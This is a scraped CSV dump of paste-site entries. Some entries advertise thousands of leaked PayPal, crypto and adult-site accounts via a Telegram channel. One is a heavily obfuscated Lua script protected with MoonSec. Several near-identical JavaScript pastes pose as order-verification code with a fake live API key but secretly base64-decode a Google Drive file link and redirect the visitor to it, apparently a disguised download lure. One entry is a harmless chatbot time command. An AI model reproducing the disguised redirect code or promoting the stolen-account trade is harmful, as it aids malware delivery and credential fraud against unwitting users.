id,title,username,language,date,content
24aQvLJA,Leaked Accounts - Fresh Hits,Ratqueenkslskskwkw,JavaScript,Saturday 26th of April 2025 11:36:19 PM CDT,07599 Accounts Posted On https://t.me/leakedbyem1nem
bTFzvYcw,good,RedRich_Dawn,Lua,Saturday 26th of April 2025 11:29:31 PM CDT,"([[This file was protected with MoonSec V3]]):gsub('.+', (function(a) _WdLihgisVGet = a; end)); return(function(r,...)local t;local h;local o;local f;local a;local d;local e=24915;local n=0;local l={};while n<691 do n=n+1;while n<0x12f and e%0x483c<0x241e do n=n+1 e=(e*555)%22813 local c=n+e if(e%0x10ee)<=0x877 then e=(e*0x158)%0x9b92 while n<0x287 and e%0x4932<0x2499 do n=n+1 e=(e-110)%16506 local d=n+e if(e%0x1b96)<=0xdcb then e=(e*0x9c)%0x6393 local e=94449 if not l[e]then l[e]=0x1 t=(not t)and _ENV or t;end elseif e%2~=0 then e=(e-0xf2)%0x673 local e=18872 if not l[e]then l[e]=0x1 h=tonumber;end else e=(e-0x3af)%0x8a1 n=n+1 local e=20467 if not l[e]then l[e]=0x1 t=getfenv and getfenv();end end end elseif e%2~=0 then e=(e*0x16a)%0x7158 while n<0xf1 and e%0x1496<0xa4b do n=n+1 e=(e*803)%16095 local c=n+e if(e%0x35a6)>=0x1ad3 then e=(e*0x204)%0x2dba local e=86442 if not l[e]then l[e]=0x1 o={};end elseif e%2~=0 then e=(e*0x295)%0x358a local e=67742 if not l[e]then l[e]=0x1 d=function(l)local e=0x01 local function n(n)e=e+n return l:sub(e-n,e-0x01)end while true do local l=n(0x01)if(l==""\5"")then break end local e=a.byte(n(0x01))local e=n(e)if l==""\2""then e=o.fFqSFoFm(e)elseif l==""\3""then e=e~=""\0""elseif l==""\6""then t[e]=function(e,n)return r(8,nil,r,n,e)end elseif l==""\4""then e=t[e]elseif l==""\0""then e=t[e][n(a.byte(n(0x01)))];end local n=n(0x08)o[n]=e end end end else e=(e*0x3e9)%0xa4b7 n=n+1 local e=38576 if not l[e]then l[e]=0x1 f=""\4\8\116\111\110\117\109\98\101\114\102\70\113\83\70\111\70\109\0\6\115\116\114\105\110\103\4\99\104\97\114\101\116\112\65\99\116\84\120\0\6\115\116\114\105\110\103\3\115\117\98\70\102\116\117\72\109\112\82\0\6\115\116\114\105\110\103\4\98\121\116\101\65\112\110\86\75\67\72\103\0\5\116\97\98\108\101\6\99\111\110\99\97\116\102\77\75\109\85\66\105\97\0\5\116\97\98\108\101\6\105\110\115\101\114\116\121\81\85\98\76\103\79\99\5"";end end end else e=(e-0x1e)%0x34b n=n+1 while n<0x281 and e%0x35c8<0x1ae4 do n=n+1 e=(e+306)%48501 local t=n+e if(e%0x4d62)<0x26b1 then e=(e*0x6e)%0x2bf7 local e=30471 if not l[e]then l[e]=0x1 a=string;end elseif e%2~=0 then e=(e*0x200)%0x75e9 local e=32119 if not l[e]then l[e]=0x1 end else e=(e-0xc3)%0x1d4d n=n+1 local e=52874 if not l[e]then l[e]=0x1 end end end end end e=(e-794)%29897 end d(f);local e={};for n=0x0,0xff do local l=o.etpActTx(n);e[n]=l;e[l]=n;end local function c(n)return e[n];end local a=(function(f,d)local a,l=0x01,0x10 local n={{},{},{}}local t=-0x01 local e=0x01 local r=f while true do n[0x03][o.FftuHmpR(d,e,(function()e=a+e return e-0x01 end)())]=(function()t=t+0x01 return t end)()if t==(0x0f)then t=""""l=0x000 break end end local t=#d while e<t+0x01 do n[0x02][l]=o.FftuHmpR(d,e,(function()e=a+e return e-0x01 end)())l=l+0x01 if l%0x02==0x00 then l=0x00 o.yQUbLgOc(n[0x01],(c((((n[0x03][n[0x02][0x00]]or 0x00)*0x10)+(n[0x03][n[0x02][0x01]]or 0x00)+r)%0x100)));r=f+r;end end return o.fMKmUBia(n[0x01])end);d(a(64,""8Am+:_r<KHlQCs5NC_""));d(a(241,""MUIsTt_)Yom5n7,*S*ITm+5457ns7)7*Y5*mUmIUssstIYtT_*)}_T_7m*T,t,7Y7m,)ZUUHI_IYI=sYTkTY_s_nIns*5onm7q,T*o,)b)U5IIUoTytoTnqnIUo7m75mn;7T7nYoyqdsItIss)IoT_s7)d_so,mn5)t__o,U,Td_fo5tI5sITI_T_5_U)U)IY)5mnsnsnnY_o7UsUTsIsmTUt*t5)7)oYomImmonnt7_nI(s,*UcHT7H,IT-t,_5Y5otm)))nInnn),5*,4YIt*,n*7,_+to)RYmYoonYommmm7_nn7ko*m7*TI7ITt)_tT*toY,o,T_to7T7,*U4Uu,UTIYscUm_i) T7_n)Lo)ost!_T,I7,,,l)<*5*s7Ttt_t__)),)5mtoYmo5)5=*_*mo,m*I7stT_T_t)_,t7_5Ytm*oI7)nT7tY,o,UYIoI*TstYt,)nt7__onY-555T_*Y *n*7UsU5IYTYToT5_)YIYmmtYU5yt5_,,_,o951,5mIms*tU_y)I_I_UY*)75)nU5_ntYn""));local e=(-23490+(function()local o,e=0,1;(function(l,n,t,e)t(n(e,e,l,e)and e(t,n,e,t),n(n,n,e,n),l(l,l and t,l and l,e),t(e,t and n,t,l))end)(function(d,l,t,n)if o>225 then return n end o=o+1 e=(e-705)%1216 if(e%1956)>=978 then e=(e+598)%12553 return l else return t(t(t and t,t,l,n),d(d,l and n,d,l),d(l,l and t,n,n),n(l,n,n and d,d))end return t(d(n,n and n,l,t and l)and l(d,d,t,n),l(d,t,n,d and d),t(t,l and n,n,n),l(l,n,d and t,t))end,function(n,l,t,d)if o>312 then return n end o=o+1 e=(e+453)%42093 if(e%1730)>865 then e=(e-40)%24141 return n(d(n,d,l,l and n),t(t,d and t,l,l),d(d and l,t,d,d)and l(n and t,n,l,t),n(n,t,n,t))else return l end return l end,function(n,l,t,d)if o>159 then return n end o=o+1 e=(e*58)%4606 if(e%1270)>635 then e=(e+964)%39571 return n else return t(l(t,d,n,n),d(t and n,n and d,l,t),d(n,n,t,l),l(n,l,d,t))end return n(t(l,l,l,n),n(l,t,d,l),d(d,l,l,t),t(l,n,l,t)and d(n,t,t,d))end,function(d,t,l,n)if o>465 then return l end o=o+1 e=(e*32)%34617 if(e%628)<314 then e=(e-451)%30322 return l else return n(n(d and d,t,t,t),n(n and n,d,l,n),l(t,n,l and n,t),n(t and t,t,t,l))end return l(d(d,d and l,l,l),l(t,n,n,n and d),d(n,n and l,n and t,l),n(l,t and t,d,d))end)return e;end)())local u=o.KJUpDzXZ or o.YtXZYCzo;local de=(getfenv)or(function()return _ENV end);local te=1;local c=4;local d=3;local t=2;local function j(_,...)local s=a(e,""DpxQgIJ7v0XM_R^l_0vggJOv_MMQg^pLRx^vM^vpgRM__gv0g^>0vJ0lgMplv^XHJgxQ^X0RIRQT^QXgxxQM^lM_7x^_RMMlvpgx^0MR7Rl_lg0QxQlRXJJvxXQ0pRRlXNg7pMRM00glQxlxXM7xxRlM0x7IQxlgM7vxp7U__^v^RllXJxxg^JphR^XiI^xQX_JQxIxXRMMQx_x7^MMvJ^QR^__pvpQIfgM7vIgJL^_pv_IgR(_70IIIR0M^0QIg!gRR00J9l^RRMIJ^lpRJXMJ_p_lIMp7vpJlI_RvJPvsQ_70ggXp0_vIJIQpM0RXxI7pX^0J7JxxpRlXg7IlQlXXR7Rg;MRMv7MWxAx_R7MRRXxJ/xx^gzR_007IpXl7XQxlgMJ^gX0IRxxlQMJ7JxllJMp8RRI0?Ixpgp^-__^v_xIOIRJxIlQXvJXx_gR57RJvnIlxG^pXI7ppJ_0X07XR7vXg_b^R(XgIgpJRv0MI_p^^+Mg77xJ^vXXJ^x^l3MxvJgRlvMX7_gIZ;_xvgJ_pg_Xv_g^pJRx0IIJp0RXX*J^xn^xXgJ_xv^MX_7xgElxMg7JQllXMR7^g{pv_gvJgv8M__v^I{xgR70JIvpX^p0^J!xxlJX_JvxM^_Mx7(QxlgRJvxQXlRM^vpgxOX_J0XJIE_Rp0sIIpgRJ0vIXQpR^XpJxx7^JXvJXx_l7Mf7xQglJMv7_Q_l^RJvxggFJ_0vXgR&^R*XXIgpJRv0MI_p^^dXxJgxJ^vXX"");local n=0;o.sfOXQJVP(function()o.dhFXIfMB()n=n+1 end)local function e(e,l)if l then return n end;n=e+n;end local l,n,f=r(0,r,e,s,o.ApnVKCHg);local function a()local l,n=o.ApnVKCHg(s,e(1,3),e(5,6)+2);e(2);return(n*256)+l;end;local p=true;local p=0 local function m()local e=n();local n=n();local d=1;local t=(l(n,1,20)*(2^32))+e;local e=l(n,21,31);local n=((-1)^l(n,32));if(e==0)then if(t==p)then return n*0;else e=1;d=0;end;elseif(e==2047)then return(t==0)and(n*(1/0))or(n*(0/0));end;return o.WXJPtn_Y(n,e-1023)*(d+(t/(2^52)));end;local g=n;local function b(n)local l;if(not n)then n=g();if(n==0)then return'';end;end;l=o.FftuHmpR(s,e(1,3),e(5,6)+n-1);e(n)local e=""""for n=(1+p),#l do e=e..o.FftuHmpR(l,n,n)end return e;end;local p=#o.ByzHXMeR(h('\49.\48'))~=1 local e=n;local function y(...)return{...},o.fYfrkwDd('#',...)end local function ee()local h={};local u={};local e={};local s={h,u,nil,e};local e=n()local r={}for t=1,e do local l=f();local e;if(l==3)then e=(f()~=#{});elseif(l==2)then local n=m();if p and o.KYAeIutp(o.ByzHXMeR(n),'.(\48+)$')then n=o.SCbAlgMM(n);end e=n;elseif(l==1)then e=b();end;r[t]=e;end;for u=1,n()do local e=f();if(l(e,1,1)==0)then local o=l(e,2,3);local f=l(e,4,6);local e={a(),a(),nil,nil};if(o==0)then e[d]=a();e[c]=a();elseif(o==#{1})then e[d]=n();elseif(o==_[2])then e[d]=n()-(2^16)elseif(o==_[3])then e[d]=n()-(2^16)e[c]=a();end;if(l(f,1,1)==1)then e[t]=r[e[t]]end if(l(f,2,2)==1)then e[d]=r[e[d]]end if(l(f,3,3)==1)then e[c]=r[e[c]]end h[u]=e;end end;for e=1,n()do u[e-(#{1})]=ee();end;s[3]=f();return s;end;local function ne(l,n,e)local t=n;local t=e;return h(o.KYAeIutp(o.KYAeIutp(({o.sfOXQJVP(l)})[2],n),e))end local function le(p,e,h)local function ee(...)local a,j,s,k,_,l,f,m,g,b,z,n;local e=0;while-1<e do if 2>=e then if e<1 then a=r(6,30,1,67,p);j=r(6,99,2,66,p);else if e>=-2 then repeat if e~=1 then l=-41;f=-1;break;end;s=r(6,77,3,87,p);_=y k=0;until true;else l=-41;f=-1;end end else if 5<=e then if e==6 then e=-2;else n=r(7);end else if 3<e then b=o.fYfrkwDd('#',...)-1;z={};else m={};g={...};end end end e=e+1;end;for e=0,b do if(e>=s)then m[e-s]=g[e+1];else n[e]=g[e+1];end;end;local e=b-s+1 local e;local o;local function r(...)while true do end end while true do if l<-40 then l=l+42 end e=a[l];o=e[te];if o>11 then if o<=17 then if 15>o then if o>=13 then if 14==o then h[e[d]]=n[e[t]];else local e=e[t]n[e]=n[e](u(n,e+1,f))end else l=e[d];end else if o<16 then n[e[t]]=(e[d]~=0);else if 17~=o then l=e[d];else if(n[e[t]]==e[c])then l=l+1;else l=e[d];end;end end end else if 20<o then if 21>=o then local r,o,f,c,a;local l=0;while l>-1 do if 2<l then if 5>l then if l~=0 then repeat if 4>l then c=r[f];break;end;a=r[o];until true;else a=r[o];end else if 1~=l then for e=31,59 do if 6>l then n(a,c);break;end;l=-2;break;end;else l=-2;end end else if l>=1 then if-2<=l then repeat if 1<l then f=d;break;end;o=t;until true;else o=t;end else r=e;end end l=l+1 end else if o==23 then do return end;else do return end;end end else if 19<=o then if 20>o then local l=e[t]local t,e=_(n[l](u(n,l+1,e[d])))f=e+l-1 local e=0;for l=l,f do e=e+1;n[l]=t[e];end;else local l=e[t]local t,e=_(n[l](u(n,l+1,e[d])))f=e+l-1 local e=0;for l=l,f do e=e+1;n[l]=t[e];end;end else for o=0,3 do if 1>=o then if-2<=o then repeat if o~=0 then h[e[d]]=n[e[t]];l=l+1;e=a[l];break;end;n[e[t]]=(e[d]~=0);l=l+1;e=a[l];until true;else h[e[d]]=n[e[t]];l=l+1;e=a[l];end else if o<3 then n[e[t]]=h[e[d]];l=l+1;e=a[l];else if(n[e[t]]==e[c])then l=l+1;else l=e[d];end;end end end end end end else if 5<o then if 9>o then if o>6 then if o<8 then local t=e[t];local l=n[e[d]];n[t+1]=l;n[t]=l[e[c]];else if(n[e[t]]==e[c])then l=l+1;else l=e[d];end;end else local r,m,p,z,g,b,k,o,y,j,s;n[e[t]]=h[e[d]];l=l+1;e=a[l];r=e[t];m=n[e[d]];n[r+1]=m;n[r]=m[e[c]];l=l+1;e=a[l];o=0;while o>-1 do if 3>o then if o>0 then if 0~=o then for e=30,64 do if 2~=o then z=t;break;end;g=d;break;end;else g=d;end else p=e;end else if 4<o then if 3<o then repeat if 6~=o then n(k,b);break;end;o=-2;until true;else o=-2;end else if 1~=o then for e=10,88 do if o~=3 then k=p[z];break;end;b=p[g];break;end;else b=p[g];end end end o=o+1 end l=l+1;e=a[l];r=e[t]y,j=_(n[r](u(n,r+1,e[d])))f=j+r-1 s=0;for e=r,f do s=s+1;n[e]=y[s];end;l=l+1;e=a[l];r=e[t]n[r]=n[r](u(n,r+1,f))l=l+1;e=a[l];n[e[t]]();l=l+1;e=a[l];do return end;end else if o>=10 then if 7<=o then repeat if 10<o then local e=e[t]n[e]=n[e](u(n,e+1,f))break;end;n[e[t]]=(e[d]~=0);until true;else local e=e[t]n[e]=n[e](u(n,e+1,f))end else local o,f,a,c,r;local l=0;while l>-1 do if l>2 then if 4>=l then if l<4 then c=o[a];else r=o[f];end else if 6>l then n(r,c);else l=-2;end end else if l<=0 then o=e;else if 1<l then a=d;else f=t;end end end l=l+1 end end end else if 2>=o then if o<1 then h[e[d]]=n[e[t]];else if o>-3 then repeat if o<2 then n[e[t]]=h[e[d]];break;end;local t=e[t];local l=n[e[d]];n[t+1]=l;n[t]=l[e[c]];until true;else local t=e[t];local l=n[e[d]];n[t+1]=l;n[t]=l[e[c]];end end else if 3>=o then n[e[t]]=h[e[d]];else if o>=2 then for l=49,88 do if o~=5 then n[e[t]]();break;end;n[e[t]]();break;end;else n[e[t]]();end end end end end l=1+l;end;end;return ee end;local t=0xff;local c={};local a=(1);local d='';(function(n)local l=n local r=0x00 local e=0x00 l={(function(f)if r>0x25 then return f end r=r+1 e=(e+0xca0-f)%0x1c return(e%0x03==0x2 and(function(l)if not n[l]then e=e+0x01 n[l]=(0xa0);d={d..'\58 a',d};c[a]=ee();a=a+((not o.cGdpbGAt)and 1 or 0);d[1]='\58'..d[1];t[2]=0xff;end return true end)'atEtf'and l[0x2](0x2a4+f))or(e%0x03==0x1 and(function(l)if not n[l]then e=e+0x01 n[l]=(0x2d);end return true end)'rZEof'and l[0x1](f+0x7b))or(e%0x03==0x0 and(function(l)if not n[l]then e=e+0x01 n[l]=(0x32);c[a]=de();a=a+t;end return true end)'jmLaH'and l[0x3](f+0x2c3))or f end),(function(o)if r>0x25 then return o end r=r+1 e=(e+0xdfe-o)%0xb return(e%0x03==0x2 and(function(l)if not n[l]then e=e+0x01 n[l]=(0x18);end return true end)'BcGxu'and l[0x2](0x18e+o))or(e%0x03==0x1 and(function(l)if not n[l]then e=e+0x01 n[l]=(0x9c);end return true end)'MtFlf'and l[0x3](o+0x260))or(e%0x03==0x0 and(function(l)if not n[l]then e=e+0x01 n[l]=(0x3e);t[2]=(t[2]*(ne(function()c()end,u(d))-ne(t[1],u(d))))+1;c[a]={};t=t[2];a=a+t;end return true end)'gydcm'and l[0x1](o+0x374))or o end),(function(o)if r>0x25 then return o end r=r+1 e=(e+0xc1e-o)%0x4e return(e%0x03==0x0 and(function(l)if not n[l]then e=e+0x01 n[l]=(0x3c);end return true end)'FWf_o'and l[0x2](0x8e+o))or(e%0x03==0x2 and(function(l)if not n[l]then e=e+0x01 n[l]=(0x60);end return true end)'rypJD'and l[0x3](o+0x3cb))or(e%0x03==0x1 and(function(l)if not n[l]then e=e+0x01 n[l]=(0x3);d='\37';t={function()t()end};d=d..'\100\43';end return true end)'LUFWk'and l[0x1](o+0x23d))or o end)}l[0x3](0x2a5)end){};local e=le(u(c));return e(...);end return j((function()local n={}local e=0x01;local l;if o.cGdpbGAt then l=o.cGdpbGAt(j)else l=''end if o.KYAeIutp(l,o.SdiaIakO)then e=e+0;else e=e+1;end n[e]=0x02;n[n[e]+0x01]=0x03;return n;end)(),...)end)((function(n,e,l,t,d,o)local o;if 3<n then if 5<n then if 7<=n then if n>7 then do return l(n,nil,l);end else do return setmetatable({},{['__\99\97\108\108']=function(e,l,t,d,n)if n then return e[n]elseif d then return e else e[l]=t end end})end end else do return d[l]end;end else if n>=0 then repeat if n>4 then local n=t;do return function()local e=e(l,n(n,n),n(n,n));n(1);return e;end;end;break;end;local n=t;local d,t,a=d(2);do return function()local e,o,l,r=e(l,n(n,n),n(n,n)+3);n(4);return(r*d)+(l*t)+(o*a)+e;end;end;until true;else local n=t;do return function()local e=e(l,n(n,n),n(n,n));n(1);return e;end;end;end end else if n<=1 then if n>=-4 then for o=36,56 do if n~=1 then do return e(1),e(4,d,t,l,e),e(5,d,t,l)end;break;end;do return function(l,e,n)if n then local e=(l/2^(e-1))%2^((n-1)-(e-1)+1);return e-e%1;else local e=2^(e-1);return(l%(e+e)>=e)and 1 or 0;end;end;end;break;end;else do return function(l,e,n)if n then local e=(l/2^(e-1))%2^((n-1)-(e-1)+1);return e-e%1;else local e=2^(e-1);return(l%(e+e)>=e)and 1 or 0;end;end;end;end else if n>0 then repeat if 3~=n then do return 16777216,65536,256 end;break;end;do return e(1),e(4,d,t,l,e),e(5,d,t,l)end;until true;else do return e(1),e(4,d,t,l,e),e(5,d,t,l)end;end end end end),...)"
THesd6x1,Order.js,dentira,JavaScript,Saturday 26th of April 2025 11:25:26 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/72660/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
waEXRZL6,Chaturbate with Tokens,Ratqueenkslskskwkw,JavaScript,Saturday 26th of April 2025 11:20:56 PM CDT,69968 Accounts Posted On https://t.me/leakedbyem1nem
Zqsn7Ai6,Market.js,dentira,JavaScript,Saturday 26th of April 2025 11:10:03 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/67247/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
Yuqfd0c6,Crypto Accounts,Ratqueenkslskskwkw,JavaScript,Saturday 26th of April 2025 11:05:33 PM CDT,13932 Accounts Posted On https://t.me/leakedbyem1nem
ndGfRHhT,TimeKriket,SilkKheldar,JavaScript,Saturday 26th of April 2025 11:01:45 PM CDT,"let version  = ""1.0"";
let createdt = ""27 april 2025"";

!addcom !time Right now Kriket's local date and time is $(time Australia/Canberra)

let usage    = '!addcom !time -ul=moderator -cd=5 $(eval u=""$(querystring)"";$(urlfetch json https://pastebin.com/raw/ndGfRHhT))';
let designer = ""UrTeamLEader/Silkenator"";
let o        = """";
let r        = """";
let u2       = """";  
 
let max_len  = 200; 
let m_s_len  = 49; 
let m_l_len  = 68; 
let u_len    = 0;      
 
m_l=""Right now Kriket's local date and time is $(time Australia/Canberra)"";
m_s=""Kriket's local time is $(time Australia/Canberra)"";
if(u)
  {
    u2 = decodeURIComponent(u);
    u_len = u2.length + 1;
    if((u_len + m_l_len) <= max_len) 
      {
        o = u2 + ' ' + m_l;
      }
    else
      { 
        if((u_len + m_s_len) <= max_len)
          {
            o = u2 + ' ' + m_s;
          }
        else
          {
             u2s = u2.slice(0,(max_len - m_s_len));
             o = u2s + ' ' + m_s;
          }          
      }
   }
else
  {
    o = m_l;
  }
 
o; "
7YsTMEUf,Untitled,dentira,JavaScript,Saturday 26th of April 2025 10:54:34 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/47305/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
tAgf2tvw,PayPal with Balance,Ratqueenkslskskwkw,JavaScript,Saturday 26th of April 2025 10:50:10 PM CDT,78534 Accounts Posted On https://t.me/leakedbyem1nem
WsQLVYx4,Untitled,Epiphemeral,JavaScript,Saturday 26th of April 2025 10:39:08 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/60856/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
